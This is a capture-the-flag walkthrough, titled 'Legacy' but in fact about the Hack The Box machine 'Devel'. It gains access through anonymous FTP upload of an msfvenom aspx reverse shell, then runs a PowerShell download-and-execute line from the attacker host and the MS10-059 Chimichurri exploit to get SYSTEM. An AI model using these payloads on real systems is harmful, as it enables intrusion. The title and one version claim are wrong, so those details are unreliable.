# Hackthebox Legacy

Reset the machine just in case.

## Enumeration

First do the standard portscanning of every tcp port on the system.

```

$ nmap -Pn -sV -sC -p- 10.10.10.5 
Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times will be slower.
Starting Nmap 7.91 ( https://nmap.org ) at 2021-10-13 12:07 EDT
Nmap scan report for 10.10.10.5
Host is up (0.041s latency).
Not shown: 65533 filtered ports
PORT   STATE SERVICE VERSION
21/tcp open  ftp     Microsoft ftpd
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
| 03-18-17  02:06AM       <DIR>          aspnet_client
| 03-17-17  05:37PM                  689 iisstart.htm
|_03-17-17  05:37PM               184946 welcome.png
| ftp-syst: 
|_  SYST: Windows_NT
80/tcp open  http    Microsoft IIS httpd 7.5
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-server-header: Microsoft-IIS/7.5
|_http-title: IIS7
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows
```

## Vulnerability analysis

### IIS

```
$ searchsploit iis 7.5     
------------------------------------------------------------------------------------------------------------ ---------------------------------
 Exploit Title                                                                                              |  Path
------------------------------------------------------------------------------------------------------------ ---------------------------------
Microsoft IIS 6.0/7.5 (+ PHP) - Multiple Vulnerabilities                                                    | windows/remote/19033.txt
Microsoft IIS 7.5 (Windows 7) - FTPSVC Unauthorized Remote Denial of Service (PoC)                          | windows/dos/15803.py
------------------------------------------------------------------------------------------------------------ ---------------------------------
Shellcodes: No Results
```

Nikto does not show anything particularly interesting
```
$ nikto -h 10.10.10.5   
- Nikto v2.1.6
---------------------------------------------------------------------------
+ Target IP:          10.10.10.5
+ Target Hostname:    10.10.10.5
+ Target Port:        80
+ Start Time:         2021-10-13 12:36:46 (GMT-4)
---------------------------------------------------------------------------
+ Server: Microsoft-IIS/7.5
+ Retrieved x-powered-by header: ASP.NET
+ The anti-clickjacking X-Frame-Options header is not present.
+ The X-XSS-Protection header is not defined. This header can hint to the user agent to protect against some forms of XSS
+ The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type
+ Retrieved x-aspnet-version header: 2.0.50727
+ No CGI Directories found (use '-C all' to force check all possible dirs)
+ Allowed HTTP Methods: OPTIONS, TRACE, GET, HEAD, POST 
+ Public HTTP Methods: OPTIONS, TRACE, GET, HEAD, POST 
+ 7866 requests: 0 error(s) and 7 item(s) reported on remote host
+ End Time:           2021-10-13 12:41:58 (GMT-4) (312 seconds)
---------------------------------------------------------------------------
```

## System hacking

### Search for IIS subdirectories

Results with the standard file and iis.txt were the same

```
$ dirb http://10.10.10.5

-----------------
DIRB v2.22    
By The Dark Raver
-----------------

START_TIME: Wed Oct 13 11:59:39 2021
URL_BASE: http://10.10.10.5/
WORDLIST_FILES: /usr/share/dirb/wordlists/common.txt

-----------------

GENERATED WORDS: 4612                                                          

---- Scanning URL: http://10.10.10.5/ ----
==> DIRECTORY: http://10.10.10.5/aspnet_client/                                                                                              
                                                                                                                                             
---- Entering directory: http://10.10.10.5/aspnet_client/ ----
==> DIRECTORY: http://10.10.10.5/aspnet_client/system_web/                                                                                   
                                                                                                                                             
---- Entering directory: http://10.10.10.5/aspnet_client/system_web/ ----
```

Fuzzing the aspnet_client directory it is possible to discover the exact IIS version

The fuzzing list: http://itdrafts.blogspot.com/2013/02/aspnetclient-folder-enumeration-and.html
```
$ dirb http://10.10.10.5/aspnet_client/system_web/ fuzzdir.txt -r

-----------------
DIRB v2.22    
By The Dark Raver
-----------------

START_TIME: Wed Oct 13 12:17:29 2021
URL_BASE: http://10.10.10.5/aspnet_client/system_web/
WORDLIST_FILES: fuzzdir.txt
OPTION: Not Recursive

-----------------

GENERATED WORDS: 68                                                            

---- Scanning URL: http://10.10.10.5/aspnet_client/system_web/ ----
==> DIRECTORY: http://10.10.10.5/aspnet_client/system_web/2_0_50727/                                                                         
+ http://10.10.10.5/aspnet_client/system_web/// (CODE:403|SIZE:1233)
```

Now we know the server is running Microsoft IIS 2.0.50727

### FTP

Logging in as Anonymous user and uploading a simple index.html reveals that the FTP directory is the root directory of the IIS server.

```
$ ftp 10.10.10.5
Connected to 10.10.10.5.
220 Microsoft FTP Service
Name (10.10.10.5:kali): Anonymous
331 Anonymous access allowed, send identity (e-mail name) as password.
Password:
230 User logged in.
Remote system type is Windows_NT.
ftp> bin
200 Type set to I.
ftp> put index.html
local: index.html remote: index.html
200 PORT command successful.
125 Data connection already open; Transfer starting.
226 Transfer complete.
16 bytes sent in 0.00 secs (226.4493 kB/s)
ftp> bye
421 Service not available, remote server has closed connection
                                                                                                                                              
┌──(kali㉿kali)-[~/Documents/CTF/hackthebox/Devel]
└─$ curl http://10.10.10.5/index.html
<H1>Hacked</H1>
```
This sounds like a job for a remote shell
```
$ msfvenom -p windows/shell_reverse_tcp LHOST=10.10.14.8 LPORT=443 -f aspx > shell.aspx
[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
[-] No arch selected, selecting arch: x86 from the payload
No encoder specified, outputting raw payload
Payload size: 324 bytes
Final size of aspx file: 2723 bytes
                                                                                                                                              
┌──(kali㉿kali)-[~/Documents/CTF/hackthebox/Devel]
└─$ ftp 10.10.10.5                                                                           
Connected to 10.10.10.5.
220 Microsoft FTP Service
Name (10.10.10.5:kali): Anonymous
331 Anonymous access allowed, send identity (e-mail name) as password.
Password:
230 User logged in.
Remote system type is Windows_NT.
ftp> bin
200 Type set to I.
ftp> put shell.aspx
local: shell.aspx remote: shell.aspx
200 PORT command successful.
125 Data connection already open; Transfer starting.
226 Transfer complete.
2723 bytes sent in 0.00 secs (72.1349 MB/s)
ftp> bye
221 Goodbye.
```
Open URL http://10.10.10.5/shell.aspx    
```
┌──(kali㉿kali)-[~/Documents/CTF/hackthebox/Devel]
└─$ nc -nvlp 443
listening on [any] 443 ...
connect to [10.10.14.8] from (UNKNOWN) [10.10.10.5] 49159
Microsoft Windows [Version 6.1.7600]
Copyright (c) 2009 Microsoft Corporation.  All rights reserved.

c:\windows\system32\inetsrv>whoami
whoami
iis apppool\web
```
Not much privileges yet, need to find a way to escalate them

## Privilege escalation

First verify the OS and other basic information
```
c:\Users>systeminfo | findstr /B /C:"OS Name" /C:"OS Version"
systeminfo | findstr /B /C:"OS Name" /C:"OS Version"
OS Name:                   Microsoft Windows 7 Enterprise 
OS Version:                6.1.7600 N/A Build 7600

c:\Users>hostname
hostname
devel

c:\Users>echo %username%
echo %username%
DEVEL$
```
It seems the host is not running any patches
```
c:\Users>systeminfo
systeminfo

Host Name:                 DEVEL
OS Name:                   Microsoft Windows 7 Enterprise 
OS Version:                6.1.7600 N/A Build 7600
OS Manufacturer:           Microsoft Corporation
OS Configuration:          Standalone Workstation
OS Build Type:             Multiprocessor Free
Registered Owner:          babis
Registered Organization:   
Product ID:                55041-051-0948536-86302
Original Install Date:     17/3/2017, 4:17:31 ��
System Boot Time:          13/10/2021, 6:36:38 ��
System Manufacturer:       VMware, Inc.
System Model:              VMware Virtual Platform
System Type:               X86-based PC
Processor(s):              1 Processor(s) Installed.
                           [01]: x64 Family 23 Model 1 Stepping 2 AuthenticAMD ~2000 Mhz
BIOS Version:              Phoenix Technologies LTD 6.00, 12/12/2018
Windows Directory:         C:\Windows
System Directory:          C:\Windows\system32
Boot Device:               \Device\HarddiskVolume1
System Locale:             el;Greek
Input Locale:              en-us;English (United States)
Time Zone:                 (UTC+02:00) Athens, Bucharest, Istanbul
Total Physical Memory:     3.071 MB
Available Physical Memory: 2.481 MB
Virtual Memory: Max Size:  6.141 MB
Virtual Memory: Available: 5.553 MB
Virtual Memory: In Use:    588 MB
Page File Location(s):     C:\pagefile.sys
Domain:                    HTB
Logon Server:              N/A
Hotfix(s):                 N/A
Network Card(s):           1 NIC(s) Installed.
                           [01]: vmxnet3 Ethernet Adapter
                                 Connection Name: Local Area Connection 3
                                 DHCP Enabled:    No
                                 IP address(es)
                                 [01]: 10.10.10.5
                                 [02]: fe80::58c0:f1cf:abc6:bb9e
                                 [03]: dead:beef::1fc
```

Next enumerate the users on the machine
```
c:\Users>net users
net users

User accounts for \\

-------------------------------------------------------------------------------
Administrator            babis                    Guest                    
The command completed with one or more errors.


c:\Users>net user babis
net user babis
User name                    babis
Full Name                    
Comment                      
User's comment               
Country code                 000 (System Default)
Account active               Yes
Account expires              Never

Password last set            18/3/2017 2:15:19 ��
Password expires             Never
Password changeable          18/3/2017 2:15:19 ��
Password required            No
User may change password     Yes

Workstations allowed         All
Logon script                 
User profile                 
Home directory               
Last logon                   18/3/2017 2:17:50 ��

Logon hours allowed          All

Local Group Memberships      *Users                
Global Group memberships     *None 
```
User babis does not require any password, that might be something interesting.

As patches are missing, use Sherlock script to find vulnerabilities:
https://github.com/rasta-mouse/Sherlock
https://vk9-sec.com/sherlock-find-missing-windows-patches-for-local-privilege-escalation/

Download github and spawn a http server which can be called from the victim machine

```
$ python -m http.server 9000 
Serving HTTP on 0.0.0.0 port 9000 (http://0.0.0.0:9000/) ...
```

Execute Sherlock remotely from the victim machine
```
c:\Windows\Temp>powershell "iex(new-object net.webclient).downloadString('10.10.14.8:9000/Sherlock.ps1');Find-AllVulns"
```

Powershell seems to get stuck, reverse shell over nc cannot handle it. One option is to go to meterpreter, but for now we use 

-winpeas.bat: https://github.com/carlospolop/PEASS-ng/tree/master/winPEAS/winPEASbat
-wesng (https://github.com/bitsadmin/wesng) is a Windows Exploit Suggester Next Generation, and it find 236 vulnerabilities.

So much to choose from, let's go with CVE-2010-2554 (MS10-059).

Change to a Windows 32-bit machine for compiling the exploit (https://github.com/egre55/windows-kernel-exploits/tree/master/MS10-059:%20Chimichurri).


FTP the executable to the target host

```
$ ftp 10.10.10.5
Connected to 10.10.10.5.
220 Microsoft FTP Service
Name (10.10.10.5:kali): anonymous
331 Anonymous access allowed, send identity (e-mail name) as password.
Password:
230 User logged in.
Remote system type is Windows_NT.
ftp> bin
200 Type set to I.
ftp> put Chimichurri.exe
local: Chimichurri.exe remote: Chimichurri.exe
200 PORT command successful.
125 Data connection already open; Transfer starting.
226 Transfer complete.
862720 bytes sent in 3.23 secs (260.6575 kB/s)
ftp> bye
221 Goodbye.

```

Start a listener and execute the exploit

```
c:\inetpub\wwwroot>Chimichurri.exe 10.10.14.16 4444
Chimichurri.exe 10.10.14.16 4444
/Chimichurri/-->This exploit gives you a Local System shell <BR>/Chimichurri/-->Changing registry values...<BR>/Chimichurri/-->Got SYSTEM token...<BR>/Chimichurri/-->Running reverse shell...<BR>/Chimichurri/-->Restoring default registry values...<BR>
c:\inetpub\wwwroot>


$ nc -nvlp 4444                                          
listening on [any] 4444 ...
connect to [10.10.14.16] from (UNKNOWN) [10.10.10.5] 49159
Microsoft Windows [Version 6.1.7600]
Copyright (c) 2009 Microsoft Corporation.  All rights reserved.

c:\inetpub\wwwroot>whoami
whoami
nt authority\system

c:\inetpub\wwwroot>
```

And finally locate the flag
```
c:\inetpub\wwwroot>dir c:\users\Administrator\Desktop
dir c:\users\Administrator\Desktop
 Volume in drive C has no label.
 Volume Serial Number is 8620-71F1

 Directory of c:\users\Administrator\Desktop

14/01/2021  11:42 ��    <DIR>          .
14/01/2021  11:42 ��    <DIR>          ..
18/03/2017  01:17 ��                32 root.txt
               1 File(s)             32 bytes
               2 Dir(s)  22.285.721.600 bytes free
```

